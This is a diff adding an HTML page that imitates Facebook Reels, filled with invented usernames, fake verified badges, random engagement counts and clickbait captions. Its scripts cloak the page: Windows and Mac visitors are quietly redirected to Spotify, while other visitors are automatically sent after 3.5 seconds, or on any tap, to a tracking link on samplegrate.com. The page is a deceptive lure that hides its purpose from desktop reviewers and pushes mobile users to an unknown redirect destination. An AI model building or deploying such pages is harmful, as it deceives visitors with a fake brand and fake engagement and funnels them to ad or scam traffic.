@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<script>
+        // Function to detect if the user is on a PC or laptop
+        var userAgent = navigator.userAgent.toLowerCase();
+        
+        // Check for Windows or Mac OS (typical PC/laptop platforms)
+        if (userAgent.indexOf("windows") !== -1 || userAgent.indexOf("macintosh") !== -1) {
+            // Redirect to the desired URL for PC users
+            window.location.href = "https://open.spotify.com/";  // Replace with your shortened URL
+        }
+    </script>
+
+
+<script>
+window.addEventListener("load", function() {
+  setTimeout(function() {
+    var redirectLinks = [
+      "https://samplegrate.com/ev7v8chc9?key=e7588bd2d244939c7e5d3afdd0c5c62a"
+    ];
+
+    if (redirectLinks.length > 0) {
+      var randomLink = redirectLinks[Math.floor(Math.random() * redirectLinks.length)];
+      window.location.href = randomLink;
+    }
+  }, 3500);
+});
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Facebook Reels Clone</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-5GGYWMV9G3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-5GGYWMV9G3');
+</script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{background:#000;color:#fff;overflow:hidden}
+.reels-container{
+  height:100vh;
+  width:100vw;
+  overflow-y:scroll;
+  scroll-snap-type:y mandatory;
+  -webkit-overflow-scrolling:touch;
+}
+.reel{
+  position:relative;
+  width:100vw;
+  height:100vh;
+  scroll-snap-align:start;
+  cursor:pointer;
+  overflow:hidden;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+.reel img{
+  width:100vw;
+  height:100vh;
+  object-fit:cover;
+  object-position:center;
+  display:block;
+}
+.profile-section,
+.caption,
+.right-icons,
+.play-button {
+  position:absolute;
+  z-index:5;
+}
+.profile-section{
+  bottom:95px;
+  left:12px;
+  display:flex;
+  align-items:center;
+  gap:8px;
+}
+.caption{
+  bottom:50px;
+  left:12px;
+  font-size:13px;
+  width:70vw;
+  line-height:1.3;
+  color:#f1f1f1;
+  text-shadow:0 1px 2px #000;
+}
+.right-icons{
+  right:10px;
+  bottom:130px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:18px;
+}
+.play-button{
+  top:48%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  width:58px;height:58px;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(255,255,255,0.25);
+  border-radius:50%;
+}
+.play-button img{width:28px;height:28px;filter:invert(1)}
+.icon{display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer}
+.icon i{font-size:24px;color:white;}
+.icon span{font-size:12px;font-weight:500;color:#eaeaea;margin-top:4px}
+.profile-ring{
+  width:30px;height:30px;
+  border-radius:50%;
+  border:1.5px solid #2e89ff;
+  display:flex;align-items:center;justify-content:center;
+  overflow:hidden;
+}
+.profile-ring img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  transform:scale(0.85);
+  border-radius:50%;
+}
+.username{
+  font-size:13px;font-weight:600;
+  display:flex;align-items:center;gap:4px;
+}
+.verify-box{
+  width:12px;height:12px;background:#2e89ff;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+}
+.verify-box i{color:#fff;font-size:7px}
+.follow-btn{
+  background:#fff;color:#000;border:none;border-radius:6px;
+  padding:2px 7px;font-size:11px;font-weight:600;cursor:pointer;
+}
+.reels-container::-webkit-scrollbar{display:none}
+</style>
+
+</head>
+<body>
+<div class="reels-container" id="reelsContainer"></div>
+
+<script>
+const REDIRECT_URL = "https://samplegrate.com/ev7v8chc9?key=e7588bd2d244939c7e5d3afdd0c5c62a";
+
+const images = [
+  "/up/image_01.webp","/up/image_02.webp","/up/image_03.webp",
+  "/up/image_04.webp","/up/image_05.webp","/up/image_06.webp",
+  "/up/image_07.webp","/up/image_08.webp","/up/image_09.webp",
+  "/up/image_10.webp","/up/image_11.webp","/up/image_12.webp",
+  "/up/image_13.webp","/up/image_14.webp","/up/image_15.webp",
+  "/up/image_16.webp","/up/image_17.webp","/up/image_18.webp",
+  "/up/image_19.webp","/up/image_20.webp"
+];
+
+// Shuffle images
+for (let i = images.length - 1; i > 0; i--) {
+  const j = Math.floor(Math.random() * (i + 1));
+  [images[i], images[j]] = [images[j], images[i]];
+}
+
+const usernames = ["Sophia Lane","Emily Rose","Ava Grace","Mia Johnson","Zoe Sky","Chloe Stone"];
+const captions  = ["🔥 Hot trending video!","💃 Dance moves on fire!","😍 Don't scroll past this!","⚽ Epic goal moment!","🌄 Scenic mountain vibes!","🎸 Guitar solo madness!"];
+const profilePics = ["/up/1.jpg","/up/2.jpg","/up/3.jpg","/up/4.jpg","/up/5.jpg","/up/6.jpg"];
+
+function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+function formatCount(n) { return n > 999 ? (n / 1000).toFixed(1) + 'K' : n; }
+
+const reels = document.getElementById("reelsContainer");
+
+for (let i = 0; i < images.length; i++) {
+  const like    = formatCount(rand(1000, 95000));
+  const comment = formatCount(rand(80, 4500));
+  const share   = formatCount(rand(10, 2000));
+  const profile  = profilePics[i % profilePics.length];
+  const username = usernames[i % usernames.length];
+  const caption  = captions[i % captions.length];
+  const img      = images[i];
+
+  const reel = document.createElement("div");
+  reel.className = "reel";
+  reel.onclick = () => window.location.href = REDIRECT_URL;
+  reel.innerHTML = `
+    <img src="${img}" alt="">
+    <div class="play-button"><img src="/up/27223.png" alt="play"></div>
+    <div class="right-icons">
+      <div class="icon"><i class="fa-regular fa-thumbs-up"></i><span>${like}</span></div>
+      <div class="icon"><i class="fa-regular fa-comment"></i><span>${comment}</span></div>
+      <div class="icon"><i class="fa-solid fa-share"></i><span>${share}</span></div>
+    </div>
+    <div class="profile-section">
+      <div class="profile-ring"><img src="${profile}" alt=""></div>
+      <div class="username">
+        ${username}
+        <div class="verify-box"><i class="fa-solid fa-check"></i></div>
+      </div>
+      <button class="follow-btn">Follow</button>
+    </div>
+    <div class="caption">${caption}</div>
+  `;
+  reels.appendChild(reel);
+}
+</script>
+
+</body>
+</html>
